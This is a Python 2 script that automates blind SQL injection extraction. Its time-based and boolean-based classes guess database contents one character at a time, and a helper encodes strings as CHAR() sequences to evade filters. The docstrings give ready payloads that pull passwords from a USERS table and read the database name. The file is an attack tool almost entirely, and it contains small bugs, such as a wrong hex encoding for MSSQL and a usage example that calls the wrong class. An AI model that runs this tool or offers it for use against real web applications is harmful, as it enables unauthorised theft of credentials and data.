#!/usr/bin/python

import string
import urllib2
import time

# all the printable characters except whitespace and such characters as \r, \n, etc
CHARPOOL = string.printable[:-6]

class SQLInjectionBase(object):

    def __init__(self, request, sqli_template):
        self.request = request
        self.sqli_template = sqli_template
        self.injection_point = self._get_injection_point()

    def _get_injection_point(self):
        if '{INJECTION}' in self.request.get_full_url():
            return 'url'
        elif '{INJECTION}' in self.request.get_data():
            return 'data'
        elif '{INJECTION}' in self.request.headers.values():
            return 'headers'
        else:
            raise Exception('Injection point not found. Check if you added {INJECTION} tag at the point of injection.')


class BlindInjectionBase(SQLInjectionBase):

    def __init__(self, request, sqli_template, charpool):
        super(BlindInjectionBase, self).__init__(request, sqli_template)

        self.charpool = charpool

    def _prepare_request(self, pos, char):
        # TODO: consider adding urlencode
        sql = self.sqli_template.replace('{POSITION}', str(pos)).replace('{CHARCODE}', str(ord(char)))
        url = self.request.get_full_url()
        data = self.request.get_data()
        headers = self.request.headers

        if self.injection_point == 'url':
            url = url.replace('{INJECTION}', sql)
        elif self.injection_point == 'data':
            data = data.replace('{INJECTION}', sql)
        elif self.injection_point == 'headers':
            for k, v in headers:
                if '{INJECTION}' in v:
                    headers[k] = headers[k].replace('{INJECTION}', sql)
                    break

        return urllib2.Request(url=url, data=data, headers=headers)


class TimeBasedBlind(BlindInjectionBase):
    """
    Time-based Blind SQL Injection Class

    Usage:
        1) Create an injection template. Use tags {CHARCODE} for letter and {POSITION} for it's position
            sqli = 'username=admin\' and iif({CHARCODE}=(select top 1 asc(mid(password,{POSITION},1)) from USERS), (SELECT count(*) FROM MSysAccessStorage As T1, MSysAccessStorage AS T2)>0, \'\')'
        2) Create urllib2.Request object and put {INJECTION} tag to the point of injection
            url = 'http://example.com/?param1={INJECTION}' # if the injection is in the URL
            data = 'param1=value&param2={INJECTION}' # if the injection is in the data
            headers = {'HeaderName':'{INJECTION}'} # if the injection is somewhere in the headers
            req = urllib2.Request(url, data, headers)
        3) Create TimeBasedBlind object. Pass request, sql injection template, delay(optional) and char pool(optional) to it
            bi = TimeBasedBlind(req, sqli, 3)
        4) Call execute() and wait for the results
            res = bi.execute()

    @:param request: urllib2.Request object, containing request data and {INJECTION} tag at the point of injection.
    @:param sqli_template: SQL injection template.
    @:param delay: (optional) amount of time that should pass to see if the injection is successful. Default value is 1.
    @:param charpool: (optional) a pool of characters to guess from. Default value is equal to string.printable[:-6].
    """
    def __init__(self, request, sqli_template, delay=1.0, charpool=CHARPOOL):
        super(TimeBasedBlind, self).__init__(request, sqli_template, charpool)

        self.delay = delay

    def guess_letter(self, pos):
        for char in self.charpool:
            req = self._prepare_request(pos, char)
            start = time.time()
            r = urllib2.urlopen(req)
            if time.time() - start >= self.delay:
                return char

        return None

    def execute(self):
        """
        Begins data extraction
        :return: Returns string, containing the results on success or None on failure
        """
        result, i = "", 1
        char = self.guess_letter(i)

        while char:
            i += 1
            result += char
            char = self.guess_letter(i)

        return result


class BooleanBasedBlind(BlindInjectionBase):
    """
    Boolean-based Blind SQL Injection Class

    Usage:
        1) Create an injection template. Use tags {CHARCODE} for letter and {POSITION} for it's position
            sqli = 'test\' or substring(database(),1,1)=\'a\'#'
        2) Create urllib2.Request object and put {INJECTION} tag to the point of injection
            url = 'http://example.com/?param1={INJECTION}' # if the injection is in the URL
            data = 'param1=value&param2={INJECTION}' # if the injection is in the data
            headers = {'HeaderName':'{INJECTION}'} # if the injection is somewhere in the headers
            req = urllib2.Request(url, data, headers)
        3) Create BooleanBasedBlind object. Pass request, sql injection template, response code, error message and char pool(optional) to it.
           There is no need to provide both response code and error message, but at least one of them must be provided.
            bi = TimeBasedBlind(req, sqli, 404, 'Not found')
        4) Call execute() and wait for the results
            res = bi.execute()

    @:param request: urllib2.Request object, containing request data and {INJECTION} tag at the point of injection.
    @:param sqli_template: SQL injection template.
    @:param response_code: (optional) Server response code if the condition is false.
    @:param error_message: (optional) Error message containing in response if the condition is false
    @:param charpool: (optional) a pool of characters to guess from. Default value is equal to string.printable[:-6].
    """
    def __init__(self, request, sqli_template, response_code='', error_message='', charpool=CHARPOOL):
        super(BooleanBasedBlind, self).__init__(request, sqli_template, charpool)

        if not response_code and not error_message:
            raise Exception('Neither response code nor error message were provided. Could not check if the result is true or false.')

        self.response_code = response_code
        self.error_message = error_message

    def guess_letter(self, pos):
        for char in self.charpool:
            req = self._prepare_request(pos, char)
            r = urllib2.urlopen(req)
            if not self.response_code == r.getcode() or not self.error_message in r.read():
                return char

        return None

    def execute(self):
        """
        Begins data extraction
        :return: Returns string, containing the results on success or None on failure
        """
        result, i = "", 1
        char = self.guess_letter(i)

        while char:
            i += 1
            result += char
            char = self.guess_letter(i)

        return result


def encode_string(strg, db):
    """
    Encodes given string into a sequence of num to char functions for the given DB
    encode_string("abc", "mysql") will return the following string without quotes "CHAR(97), CHAR(98), CHAR(99)"
    Database types:
        mysql
        sqlite
        mssql
        oracle
        postgresql

    :param strg: String to encode
    :param db: Database type
    :return: String, containing a sequence of num to char functions.
    """
    res = ''
    if db == 'mysql' or db == 'sqlite':
        for char in strg:
            res += 'CHAR({}),'.format(ord(char))
        return res.strip(',')
    elif db == 'mssql':
        for char in strg:
            res += 'CHAR(0x{}),'.format(ord(char))
        return res.strip(',')
    elif db == 'oracle' or db == 'postgresql':
        for char in strg:
            res += 'CHR({}),'.format(ord(char))
        return res.strip(',')
